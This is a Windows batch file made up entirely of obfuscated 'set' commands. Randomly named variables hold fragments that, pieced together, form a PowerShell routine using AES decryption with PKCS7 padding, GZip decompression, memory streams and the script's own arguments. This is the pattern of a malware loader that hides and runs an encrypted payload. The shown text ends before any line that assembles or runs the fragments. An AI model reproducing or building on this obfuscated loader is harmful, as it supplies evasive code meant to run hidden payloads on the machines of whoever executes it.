@echo off
set "etBYQDUqAZ=V = "
set "idkVcMkmJP=ne);"
set "WOUVLxeAmZ=mObr"
set "eSJNxyiXOi=yste"
set "AywmeHKfdy=F = "
set "rjhoRQprnF=tem."
set "gqyoRuZAer=Comp"
set "sydkqSarLE=.Mod"
set "oOXueODwyY=$Sgg"
set "vrOqWKSgQd=ress"
set "qdQBSzrJrZ=]::C"
set "YDgKdHWAFJ='[-1"
set "KxHvSMKZPY=$FaG"
set "CdvZcFddUZ=TllA"
set "AnTVXrxUob=m.Re"
set "pKheshTyhS=e = "
set "ozmArRBAud=] -j"
set "OeIsPwWOAP=DfCf"
set "cZNUEXwlIN=s75K"
set "mryoXMykff=cryI"
set "ARteWztlcZ=BF ="
set "wjPRVUaUrC=ct S"
set "BWuudLkXfS=zKKi"
set "lgUPTizkAD=Rtll"
set "IUKsQBljlq=m.IO"
set "UxEsKzKGtk=nage"
set "kXTYuDkZUu=m(, "
set "rIUefaIrPv=ll ="
set "NtRqQcQQkJ=nirt"
set "lQOXHRUlqP=MXBF"
set "yWhpqXAQvz=)($y"
set "aPznKGiivd=$yMX"
set "QWwxqApTro=$lRt"
set "SEjCPRpBcZ=ggzC"
set "IHDxpLgfRo=[IO."
set "safDzkNJDk=ment"
set "YOxRxbMgrS=mory"
set "oBcTWKNdlw=urit"
set "RBlBONyDBZ=ptog"
set "zpKXuUySSz=pher"
set "PkmziLJelP=$xFc"
set "hJmmwuwoAN=g = "
set "hsFUhenAwm=..-1"
set "dKjoXynLrB=fore"
set "koWlDbvJFW=New-"
set "fgAMYVoZOm=l5E7"
set "nPCNzIqEzx=Stre"
set "wMUDOJEgEO= = $"
set "sBBPBowOKA=-joi"
set "POlgVBvsrx=.Cop"
set "zlkVvticsK=('%*'"
set "JOnZZqJyFV=oArr"
set "ldXZOCHEBh=oint"
set "MSEwTkPwEJ=;$ib"
set "ChWXUdIUSP=stem"
set "KwaZKIzaET=F, 0"
set "joZxKeryrO=-nop"
set "cNmdWGKmis=le  "
set "TjIniPiNTb=::De"
set "FsmORQfTCv=morF"
set "IFlxBtvNft=tem."
set "AQuXLZMBdr=ode]"
set "KwgcZtfTqL=ay()"
set "DtaTynwmzJ=pres"
set "XcXPasHkUO=yTo("
set "aWVrMZXKVu=join"
set "ayJWbDhAHE=:('g"
set "fmGuuXVsrP=PKCS"
set "vFtnXkRITi='')("
set "hYudeJzUBc=join"
set "OuYiyCtSUQ=D) {"
set "fYJCjPtiEx=eam("
set "ALXvrgFZCG=; };"
set "NFZfHSoVTp=gsYZ"
set "otvjlUbCyO=ionM"
set "wwLXcTAzha=7;$S"
set "JrjCjPLwzy=y.Ci"
set "inOuDMBaJB=-4] "
set "MqPjZRuMzY=[Env"
set "yWTplvyNDF=ck($"
set "wnspnfDSmB=.Cry"
set "GZlOlGOVVk=tsWi"
set "eGVKZLtqRp= = $"
set "arOoDrmBSc=gnir"
set "velIwYjkMH=();$"
set "aTMroqwGVz=('da"
set "zjdCcZtxSc=em.C"
set "BtmgIkLjkA=MXBF"
set "NXcKXovuUW=E.En"
set "ZsrTEmGJns=V = "
set "JCykgeJNin= '')"
set "roQhLuicid=ect "
set "XLJuiGTJmT=3); "
set "VgWQBPtvOo=();$"
set "bUPOVojUQS=]::N"
set "JQIaezydLC=.GZi"
set "clpWPdTjfh=ion."
set "ddgndpWhHN=BF);"
set "IvhoqzIEYj=PxEW"
set "MkcKEhRJtl= = ["
set "xmBDTmjYpX=comp"
set "FrvekWWjUe=[Sys"
set "RouKnIFbTG=bstr"
